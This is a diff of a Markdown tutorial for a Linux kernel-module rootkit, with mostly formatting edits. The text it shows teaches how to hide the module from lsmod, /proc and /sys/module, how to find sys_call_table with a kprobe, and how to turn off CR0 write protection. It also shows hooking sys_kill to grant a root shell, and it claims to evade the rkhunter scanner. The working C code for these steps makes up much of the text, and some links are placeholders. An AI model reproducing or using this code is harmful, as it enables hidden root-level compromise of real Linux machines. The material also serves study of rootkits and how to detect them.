@@ -166,16 +166,15 @@ So,
 image:
 ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog7.png?raw=true)
 
-> ***Now we can hide our rootkit LKM from **_`lsmod`_ command, _`/proc/modules`_ file (procfs)** and **_`/proc/kallsyms`_ file (procfs) !*****
+> ***Now we can hide our rootkit LKM from **_`lsmod`_ command, _`/proc/modules`_ file (procfs)** and **_`/proc/kallsyms`_ file (procfs) !***
 
 2. Targeting _/sys/modules_ directory
 
-&nbsp;
     Function name, where it is implemented in my project: [sys_module_hide_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L85)
-&nbsp;
+
     Then,
     What about _"/sys/module/<THIS_MODULE>/"_ directory ?
-&nbsp;
+
     I searched "kobject" pattern in _"/lib/modules/5.11.0-49-generic/build/include/linux/module.h"_ path and I got the structure named, "**module_kobject**"
 
 ```c
@@ -193,15 +192,14 @@ image:
         ...
         };
 ```
-&nbsp;
-    We can see this very portion of structure named **module** is responsible for _`/* Sysfs stuff. */`_.
+We can see this very portion of structure named **module** is responsible for _`/* Sysfs stuff. */`_.
     So, we became sure _"module_kobject"_ can be the one.
-&nbsp;
-    I searched again but now with "module_kobject" pattern in the same path, to see where is this structure used. Fortunately, that very part is documented well enough to save me (=n00b) from eyeballing all around the gigantic _"module.h"_ file. Although there is no guarantee that I would have become sure that _"module_kobject"_ gonna be the main point of attraction even after searching through the whole file in absence of documentation.
-&nbsp;
-    So, thanks to <ins>Kernel Developers!!!</ins>.
-&nbsp;
-    Anyways...
+
+I searched again but now with "module_kobject" pattern in the same path, to see where is this structure used. Fortunately, that very part is documented well enough to save me (=n00b) from eyeballing all around the gigantic _"module.h"_ file. Although there is no guarantee that I would have become sure that _"module_kobject"_ gonna be the main point of attraction even after searching through the whole file in absence of documentation.
+
+So, thanks to <ins>Kernel Developers!!!</ins>.
+
+Anyways...
 ```c
     // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
     // elixir.bootlin: pattern: module_kobject
@@ -238,16 +236,15 @@ image:
         struct list_head *next, *prev;
     };
 ```
-&nbsp;
-    Again the same case, just like **procfs** and **lsmod** scenario. We will simply delete the **kobject mapping of our rootkit module** from that structure which is responsible for storing it as a LKM kobject.
-&nbsp;
-    In header file named ***"kobject.h"***, structure named, **struct kobject** is present, in which there is a member named, **entry** (struct list_head entry) is defined, which is actually responsible for storing **kobject mapping caused due to our loaded rootkit LKM**.
-&nbsp;
-    We're gonna delete 2 things: 
-      1. Delete our rootkit LKM from **`/sys/module/`** directory with the help of `kobject_del()`.
-         But what will be our <ins>parameter value</ins>?
-&nbsp;&nbsp;
-         We will be deleting our module right? It will be expressed by `THIS_MODULE`. So we will deleting `THIS_MODULE` in such a way that kobject related to it also gets deleted.
+Again the same case, just like **procfs** and **lsmod** scenario. We will simply delete the **kobject mapping of our rootkit module** from that structure which is responsible for storing it as a LKM kobject.
+    
+In header file named ***"kobject.h"***, structure named, **struct kobject** is present, in which there is a member named, **entry** (struct list_head entry) is defined, which is actually responsible for storing **kobject mapping caused due to our loaded rootkit LKM**./
+    
+We're gonna delete 2 things:
+1. Delete our rootkit LKM from **`/sys/module/`** directory with the help of `kobject_del()`.
+But what will be our <ins>parameter value</ins>?
+
+We will be deleting our module right? It will be expressed by `THIS_MODULE`. So we will deleting `THIS_MODULE` in such a way that kobject related to it also gets deleted.
 ```c
           // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
           // elixir.bootlin: pattern: kobject_del
@@ -304,8 +301,7 @@ image:
 
           &THIS_MODULE->mkobj.kobj
 ```
-&nbsp;
-      2. Delete the kobject, which is mapped by our rootkit LKM from "entry" list using `list_del()`. We will be using the same `list_del()` function that we used before to delete our rootkit LKM from _`lsmod`_ command, _`/proc/modules`_ file (procfs) and _`/proc/kallsyms`_ file (procfs), but this time with different <ins>parameter value</ins>. [source: [page-6-last-paragraph](https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf)]
+2. Delete the kobject, which is mapped by our rootkit LKM from "entry" list using `list_del()`. We will be using the same `list_del()` function that we used before to delete our rootkit LKM from _`lsmod`_ command, _`/proc/modules`_ file (procfs) and _`/proc/kallsyms`_ file (procfs), but this time with different <ins>parameter value</ins>. [source: [page-6-last-paragraph](https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf)]
 ```c
           // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
           // elixir.bootlin: pattern: entry
@@ -327,27 +323,24 @@ image:
     
           &THIS_MODULE->mkobj.kobj.entry
 ```
-&nbsp;
-          1st three, (1,2,3) are just the same as previous case. Just adding `entry` in this context.
-&nbsp;    
+1st three, (1,2,3) are just the same as previous case. Just adding `entry` in this context.
+    
 > ***Now we can hide our rootkit LKM from **`/sys/module/`** directory (_LKM logging directory_) !***
 
-&nbsp;
-	![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog8.png?raw=true)
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog8.png?raw=true)
 
 ##### But there is a problem to use this function. We cannot re-enable our LKM rootkit to `show` mode again, i.e., we can't `rmmod` the rootkit according to our will. The only way left is rebooting the whole machine. link: [reveng_rtkit repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L94). I will explain it later in this blog.
 ----
 #### Part3: Revealing LKM from _lsmod_,  _/proc/modules_ file, _/proc/kallsyms_ file and _/sys/module/[THIS_MODULE]/_ directory according to our will:
 1. Targeting _"lsmod"_, _"/proc/modules"_ file, and _"/proc/kallsyms"_ file
 
-    &nbsp;
-    Function name, where it is implemented in my project: [proc_lsmod_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L125)
+Function name, where it is implemented in my project: [proc_lsmod_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L125)
 
-    1. In `proc_lsmod_show_rootkit()`, our rootkit module is just added back to main list of modules, where it was previously.
-    2. We will actually store the location of the previously loaded LKM so that we can add our loaded rootkit LKM just after that particular stored location, later according to our need. This also helps to preserve the <ins>Serial order of our rootkit LKM</ins> to avoid suspicion.
+   1. In `proc_lsmod_show_rootkit()`, our rootkit module is just added back to main list of modules, where it was previously.
+   2. We will actually store the location of the previously loaded LKM so that we can add our loaded rootkit LKM just after that particular stored location, later according to our need. This also helps to preserve the <ins>Serial order of our rootkit LKM</ins> to avoid suspicion.
 
         **For adding our loaded <ins>rootkit LKM</ins> back to the main module linked list**:
-        ```c
+```c
           // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
           // elixir.bootlin: pattern: list_add
 
@@ -364,11 +357,10 @@ image:
                   __list_add(new, head, head->next);
           }
 
-        ```
+```
 ----
 2. Targeting _"/sys/module/"_ directory:
 
-    &nbsp;
     Function name, where it is implemented in my project: [sys_module_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L155)
 
     I have told you guys/gals earlier in my [README.md](https://github.com/reveng007/reveng_rtkit#note) file that I haven't used _tidy()_, _sys_module_hide_rootkit()_ and _sys_module_show_rootkit()_. Now, I will be discussing about the reasons behind that decision.
@@ -518,10 +510,10 @@ I tried my level best to demonstrate both the type of working from my rootkit's 
         -----
 
         #### NOTE:
-        Every Console has log level called as the **Console log level**.
-        Any message with a log level number **lesser** than the **Console log level** gets <ins>displayed on the Console</ins>.
-        Eg:
-        Log level < Console log level
+        Every Console has log level called as the **Console log level**.\
+        Any message with a log level number **lesser** than the **Console log level** gets <ins>displayed on the Console</ins>.\
+        Eg:\
+        Log level < Console log level\
         => log level gets displayed on the console
           
         Other messages with log level >= Console log level, are logged in the kernel log, which can be looked into using command "dmesg".
@@ -642,7 +634,7 @@ I tried my level best to demonstrate both the type of working from my rootkit's 
         The code is present in [here](https://github.com/reveng007/reveng_rtkit/blob/main/user_src/client_usermode.c). I followed Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/test_app.c) repo. I don't think this code needs that much of explanation to explain it's working, it's pretty much self-explanatory.
 
         ### NOTE:
-        > I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits. This actually helped to `bypass` _signature detection_ of **rkhunter antirootkit**, [visit](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).
+        > I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits. This actually helped to `bypass` _signature detection_ of **rkhunter antirootkit**. [visit](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).
 
   2. ***`Syscall Interception/ Hijacking method`***:
 
@@ -653,50 +645,50 @@ I tried my level best to demonstrate both the type of working from my rootkit's 
 We will use, rather misuse systemcall to communicate between usermode and kernel mode and grab our ultimate cookie :cookie:.
       This is the main/common thing for which a LKM based rootkit is famous for. There are many methods to perform **Syscall interception** in Linux.
 
-      I followed this [blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall](https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6) to know all the available linux syscall interception techniques.
+   I followed this [blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall](https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6) to know all the available linux syscall interception techniques./
       I implemented the ***Syscall table hijacking*** technique. Personally, I liked the **`sys_close syscall function`** technique but the sys_close syscall function is ***not*** exported any more since **`kernel version: 4.17.0`**([Source: sys_close](https://github.com/NoviceLive/research-rootkit/issues/3)), so discarded.
 
-      I found another [blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) on _different_ types of ***Syscall table hijacking*** techniques that are available in the market.
+   I found another [blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) on _different_ types of ***Syscall table hijacking*** techniques that are available in the market.
       I liked the **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique as it is an easy to go solution to perform <ins>hooking</ins>. 
       But, there is a _caveat_!
       This function is not exported anymore by default from **`kernel versions: 5.7.0`** onwards,[[Source: xcellerator](https://github.com/xcellerator/linux_kernel_hacking/issues/3)]. We have to make some tweaks to get around this. I will be explaining that soon. Just like `kallsyms_lookup_name` symbol, `sys_call_table` is also **not** exported, actually to prevent misuse that we are targeting to make.
       
-      I'm dividing all those steps from getting the `address of syscall table` to <ins>hooking</ins> `individual syscalls` pointwise which are discussed in the aforementioned blog post.
+   I'm dividing all those steps from getting the `address of syscall table` to <ins>hooking</ins> `individual syscalls` pointwise which are discussed in the aforementioned blog post.
 
-      #### Step1: <ins>Finding the address of the `syscall table`, which is represented by `sys_call_table` symbol</ins>.
+   #### Step1: <ins>Finding the address of the `syscall table`, which is represented by `sys_call_table` symbol</ins>.
 
-        So, what the heck is syscall table?
+   So, what the heck is syscall table?/
         It is actually a table which maps linux syscalls to their corresponding syscall ids which are mapped with their corresponding kernel address.
         
-        It is somewhat like this.
+   It is somewhat like this./
         ![](https://docs.microsoft.com/en-us/security/research/project-freta/media/report-kernel-syscalls.png?raw=true)
-        ### NOTE:
-        ```
+    ### NOTE:
+```
         This is actually the "syscall table" for windows but the concept is same.
-        ```
-        We can see the address of syscall table from `/proc/kallsyms` file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? ***[link](ADD link to _`/proc/kallsyms`_ file (procfs)) portion***).
+```
+   We can see the address of syscall table from `/proc/kallsyms` file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? ***[link](ADD link to _`/proc/kallsyms`_ file (procfs)) portion***).
 
         ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog11.png?raw=true)
 
-        Why can we see it now, even before loading our module?
+   Why can we see it now, even before loading our module?/
         => Very simple, it is already in use by other kernel modules of linux.
 
-        ### NOTE:
-        ```
+   ### NOTE:
+```
         As all the dynamically loaded kernel module symbols are stored in "/proc/kallsyms" file belongs to kernel mode, the executing code from usermode has 
         no ability to directly access hardware or reference memory. So, use `sudo` or root user to access the "/proc/kallsyms" file.
-        ```
-        Now, I think, you can get the idea why I have choosen **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique over others. This is because **`kallsyms_lookup_name()`** function will find out the address of the syscall table from `/proc/kallsyms` file and we can also cross-check the result generated by our code with the actual address as shown by `/proc/kallsyms` file. 
-&nbsp;
-Yeah!!! both will basically do the same thing, one is via `bash script` and other via `LKM`, but there is always a different level of satisfaction after coding a kernel program correctly :wink:.
+```
+   Now, I think, you can get the idea why I have choosen **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique over others. This is because **`kallsyms_lookup_name()`** function will find out the address of the syscall table from `/proc/kallsyms` file and we can also cross-check the result generated by our code with the actual address as shown by `/proc/kallsyms` file. 
+
+   Yeah!!! both will basically do the same thing, one is via `bash script` and other via `LKM`, but there is always a different level of satisfaction after coding a kernel program correctly :wink:/
         We will get the address of `syscall table` via **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique, as I mentioned it before.
         So now comes the time to show the trick, right?
 
-        The trick is basically, we would make our own custom made `kallsyms_lookup_name()` function using ***kprobes***.
+   The trick is basically, we would make our own custom made `kallsyms_lookup_name()` function using ***kprobes***.
 
-        According to this [blog: ish-ar.io/kprobes-in-a-nutshell](https://ish-ar.io/kprobes-in-a-nutshell/)
+   According to this [blog: ish-ar.io/kprobes-in-a-nutshell](https://ish-ar.io/kprobes-in-a-nutshell/)/
         : **kprobe** can be used to <ins>dynamically break</ins> into _kernel routine_ and collect debugging information, i.e. via **dynamically loaded kernel module symbols**.
-        ```c
+```c
         // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
         // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
 
@@ -711,54 +703,54 @@ Yeah!!! both will basically do the same thing, one is via `bash script` and othe
 
           ...
           };
-        ```
-        We gonna need this two functions, one to set the function name, in this case, `kallsyms_lookup_name()` function and other to get the `address of the probe point`, i.e., the address of `kallsyms_lookup_name symbol` and eventually, the `address` of `sys_call_table`.
+```
+   We gonna need this two functions, one to set the function name, in this case, `kallsyms_lookup_name()` function and other to get the `address of the probe point`, i.e., the address of `kallsyms_lookup_name symbol` and eventually, the `address` of `sys_call_table`.
 
-        Lets make our code to retrieve the address of the sys_call_table....
+   Lets make our code to retrieve the address of the sys_call_table....
 
-        1. Adding necessary libraries.
-        ```c
+   1. Adding necessary libraries.
+```c
         #include <linux/init.h>		/* Needed for the macros */
         #include <linux/module.h>	/* Needed by all modules */
         #include <linux/kernel.h>	/* Needed for printing log level messages */
         #include <linux/kprobes.h>
-        ```
-        2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
-        ```c
+```
+   2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
+```c
         static struct kprobe kp = {
             .symbol_name = "kallsyms_lookup_name"
         };
-        ```
-        3. The main operation will take place in the entry function.
+```
+   3. The main operation will take place in the entry function./
         For storing address of sys_call_table
-        ```c
+```c
 	      unsigned long *syscall_table;
-        ```
-        As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original `kallsyms_lookup_name`.
-        ```c
+```
+   As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original `kallsyms_lookup_name`.
+```c
 	      /* // Lookup the address for a symbol. Returns 0 if not found.
 	       * unsigned long kallsyms_lookup_name(const char *name);
 	       */
 	      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 	      kallsyms_lookup_name_t kallsyms_lookup_name;
-        ```
-        Function, `register_kprobe()` specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
-        ```c
+```
+   Function, `register_kprobe()` specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
+```c
         register_kprobe(&kp);
-        ```
-        To get the address of `kallsyms_lookup_name` symbol. As soon as storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now, so unregistering it.
-        ```c
+```
+   To get the address of `kallsyms_lookup_name` symbol. As soon as storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now, so unregistering it.
+```c
         kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 
         unregister_kprobe(&kp);
-        ```
-        As we have got the address of `kallsyms_lookup_name` symbol, now we can use this to get the address of `syscall table`.
-        ```c
+```
+   As we have got the address of `kallsyms_lookup_name` symbol, now we can use this to get the address of `syscall table`.
+```c
         syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-        ```
-        4. So the full code:
-        ```c
+```
+   4. So the full code:
+```c
         #include <linux/init.h>		/* Needed for the macros */
         #include <linux/module.h>	/* Needed by all modules */
         #include <linux/kernel.h>	/* Needed for printing log level messages */
@@ -839,25 +831,24 @@ Yeah!!! both will basically do the same thing, one is via `bash script` and othe
         MODULE_AUTHOR("reveng007");
         MODULE_DESCRIPTION("Demo syscall table hijaking");
         MODULE_VERSION("1.0");
-        ```
-        #### Output:
-        ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true)
+```
+   #### Output:
+   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true)
 
-&nbsp;
-Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :wink:. 
-&nbsp;
-#### Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.
-&nbsp;
-      Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.
-&nbsp;
-      According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):
+   Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :wink:. 
+
+   #### Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.
+
+   Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.
+
+   According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):/
       _Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections._
-&nbsp;
-      Therefore, we must disable the WP flag before modifying sys_call_table. => ***`WP flag must be set to 0`***.
-&nbsp;
-      1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/72a939257c42562222b2b4c0785c46997cb4e1d1/kernel_src/reveng_rtkit.c#L308).
+
+   Therefore, we must disable the WP flag before modifying sys_call_table. => ***`WP flag must be set to 0`***.
+
+   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/72a939257c42562222b2b4c0785c46997cb4e1d1/kernel_src/reveng_rtkit.c#L308).
       Reading the status/state of cr0 register.
-&nbsp;
+
 ```c
           cr0 = read_cr0();
 ```
@@ -866,15 +857,15 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
           read_cr0(): Reading the status/state of cr0 register.
           write_cr0(): Writing to the cr0 register.
 ```
-&nbsp;
-      2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L310).
-&nbsp;
+
+   2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L310).
+
       Setting WP flag in cr0 register to `zero`. But how to do it?
-&nbsp;         
+         
          According to [change-value-of-wp-bit-in-cr0](https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411):
          As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don’t need to call write_cr0() function.
          We will be using ***this function*** to **write in cr0 register** instead of standard `write_cr0() function`.
-&nbsp;    
+    
          Here, `__force_order` is used to force instruction serialization.
 ```c
           static inline void write_cr0_forced(unsigned long val)
@@ -884,9 +875,8 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
             asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
           }
 ```
-&nbsp;
-      3. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323)
-&nbsp;
+   3. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323)
+
       Now, we will be using this function, `write_cr0_forced` to set WP flag to zero in cr0 register.
 ```c
           static inline void unprotect_memory(void)
@@ -895,50 +885,49 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
             write_cr0_forced(cr0 & ~0x00010000);    // Setting WP flag to 0 => writable
           }
 ```
+   #### Step3: <ins>Performing the actual hooking</ins>.
 
-      #### Step3: <ins>Performing the actual hooking</ins>.
-
-      According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):
+   According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):/
       The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called [pt_regs](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12), which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in. 
 
-      So, => We gonna need pt_regs to do our shit!
+   So, => We gonna need pt_regs to do our shit!
 
-      I actually intercepted two syscalls:
-      1. **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)
-	  &nbsp;
-          Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.
+   I actually intercepted two syscalls:/
+      1. **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)/
 
-          Now, it's time to perform hooking.
-          But, what is hooking exactly?
-          Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.
-          Remember, we made the syscall table [editable](https://link-----step2-link--------) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall.
+   Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.
+
+   Now, it's time to perform hooking./
+          But, what is hooking exactly?/
+          Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario./
+          Remember, we made the syscall table [editable](https://link-----step2-link--------) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall./
           > ***NOTE*** : In programming world, syscall is nothing but a function.
 
-          As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.
+   As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.
 
-          The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).
+   The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).
 
-          1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)
+   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)/
               So, let's define a custom function type to store original syscall, i.e., ***__NR_kill***.
-              ```c
+```c
               typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
-              ```
-              As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?
+```
+   As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?/
           2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)
               Creating function to store original syscall, i.e., ***__NR_kill***.
-             ```c
+```c
              static tt_syscall orig_kill;
-             ```
-          3. Let's store the original syscall
-             ```c
+```
+   3. Let's store the original syscall
+```c
              orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
-             ```
-             As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_.
+```
+   As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_./
           4. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.
 
-             Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario).
+   Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario)./
              So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.
-              ```c
+```c
               orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
               unprotect_memory();
@@ -946,13 +935,13 @@ Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :win
               __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
               protect_memory();
-              ```
-              You might be thinking, what the heck is hacked_kill?
-              It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.
-            5. So, now what ? &nbsp;
+```
+   You might be thinking, what the heck is hacked_kill?/
+              It is actually the function (mal. syscall) that we created, which I will introduce you in the next step./
+            5. So, now what ?/
 Remember that? **providing rootshell** portion earlier in this blog (if not, please go and [visit](https://----providing-rootshell-link----), it's obvious to forget as this blog is pretty long, don't be harsh on yourself! :hugs:)
               We will be implementing that _getting rootshell_ mechanism via _kill syscall_.
-                  ```c
+```c
                   static void set_root(void)
                   {
                     /*
@@ -1015,13 +1004,13 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                     }
                     return 0;
                   }
-                  ```
-                  If you visit [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/), and search for _sys_kill_ you can see that it depends on 3 registers, **rax** (which contains the syscall id), **rdi** (which contians the file descriptor) and **rsi** (which is the location, where the passed arguments is to be stored). 
+```
+   If you visit [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/), and search for _sys_kill_ you can see that it depends on 3 registers, **rax** (which contains the syscall id), **rdi** (which contians the file descriptor) and **rsi** (which is the location, where the passed arguments is to be stored). 
                   
-                  So here, we are only concerned about **rsi** register as we are interested in the arguments that are passed. We can see that we indeed need `int sig` to be placed in ***si*** register.
+   So here, we are only concerned about **rsi** register as we are interested in the arguments that are passed. We can see that we indeed need `int sig` to be placed in ***si*** register.
 
-                  So, that means:
-                  ```c
+   So, that means:
+```c
                   #define GET_ROOT 64
 
                   static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
@@ -1044,17 +1033,17 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
                     }
                     return 0;
                   }
-                  ```
-                  line2 :&nbsp; `int sig = (int) pt_regs->si` => Stores the passed argument, in this case it is: `64`, [source](https://xcellerator.github.io/posts/linux_rootkits_03/) (Only the 1st portion before _Hooking kill_).
+```
